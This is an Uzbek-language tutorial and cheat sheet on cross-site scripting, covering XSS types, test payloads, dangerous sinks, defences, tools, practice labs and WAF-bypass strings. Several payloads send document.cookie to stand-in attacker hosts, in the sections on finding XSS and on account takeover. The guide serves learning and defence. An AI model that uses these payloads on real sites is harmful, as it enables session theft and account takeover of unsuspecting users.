🛡️ JavaScript (XSS & Web Exploits) — Batafsil Qo‘llanma
📌 1. XSS nima?

Cross-Site Scripting (XSS) — bu hujumchi saytga foydalanuvchi brauzerida ijro bo‘ladigan zararli JavaScript kodini joylashtirishi.

XSS turlari:
Tur	Tavsif
Reflected XSS	Payload URL orqali yuboriladi va shu zahoti sahifaga qaytadi
Stored XSS	Payload serverda saqlanadi (comment, profile, posts, chats)
DOM-Based XSS	JavaScript DOMni noto‘g‘ri ishlashi natijasida, serverga tegmaydi
🔥 2. Eng keng tarqalgan XSS payloadlar
✔ Oddiy alert testi
<script>alert(1)</script>

✔ HTML kontekstida
"><script>alert('XSS')</script>

✔ Event handler XSS
<img src=x onerror=alert('XSS')>

✔ DOM XSS testi
"><img src=1 onerror=alert(document.domain)>

✔ Cookie o‘g‘irlash (faqat o‘quv maqsadida!)
<script>
fetch("http://attacker.com/steal?c=" + document.cookie)
</script>

🧠 3. XSSni qanday topish?
🔍 1) Inputlar → Outputlarda aynan qanday ko‘rinmoqda?

URL parametrlar

Form inputlar

Search box

Comments

User profile

DOM XSSni topish uchun esa:

🔍 Developer Tools → Sources → Event Listeners → JavaScript sinklarini tekshirish:

sink funktsiyalar:

innerHTML

document.write

location.hash

eval()

setTimeout("evil()", 0)

🚀 4. Real Web Exploits misollari
✔ 1) Login formga JavaScript joylash

Agar sayt HTML encode qilmasa:

Input:

" autofocus onfocus=alert('Hacked') x="

✔ 2) Comment tizimida Stored XSS

Commentga:

<script>fetch("http://server.com/cookie?c="+document.cookie)</script>


Har kirgan foydalanuvchi → cookie o‘g‘irlanadi.

✔ 3) URL orqali Reflected XSS
https://site.com/search?q=<img src=x onerror=alert(1337)>

🧨 5. XSSdan foydalanib hisobni takeover qilish

Agar vebsaytda session cookie HttpOnly EMAS bo‘lsa:

Cookie hijack:
<script>
new Image().src="http://attacker.com/grab?cookie="+document.cookie;
</script>


Hujumchi cookie orqali avtomatik login qilishi mumkin.

🛡️ 6. XSSdan himoyalanish
Himoya turi	Tavsif
Output Encoding	innerHTML emas, balki .textContent ishlatish
CSP (Content Security Policy)	<script> bloklanadi, domain cheklanadi
HttpOnly cookies	document.cookie orqali o‘qib bo‘lmaydi
Input Validation	HTML taglarining oldini olish
WAF	XSS payloadlarni filtrlaydi
🧰 7. Amaliy ekspluatatsiya qilish uchun vositalar
Asbob	Maqsad
Burp Suite	Requestlarni o‘zgartirish, XSS test qilish
XSStrike	XSS payload generatsiya
DalFox	XSS scanning
XSS Hunter	Stored XSS monitoring
Kali Linux browser exploitation tools	PoC tayyorlash
🧪 8. Praktika uchun saytlar (XSS o‘rganish)
Platforma	Tavsif
PortSwigger Web Academy	Eng kuchli XSS lablar
OWASP Juice Shop	Full vulnerabilities
DVWA (Low / Medium / High)	XSS mashqlari
bWAPP	Browser-based vulnerabilities
HackTheBox Web Challenges	Murakkab foydalanuvchi top-level XSS vazifalar
📦 9. Professional XSS Cheat Sheet
Eng ko‘p ishlatiladigan bypasslar:
🔹 HTML attribute bypass:
"><svg onload=alert(1)>

🔹 JavaScript encoding bypass:
javascript:alert(1)

🔹 UTF-7 bypass (eski brauzerlarda):
+ADw-script+AD4-alert(1)+ADw-/script+AD4-

🔹 WAF bypass:
<scr<script>ipt>alert(1)</scr</script>ipt>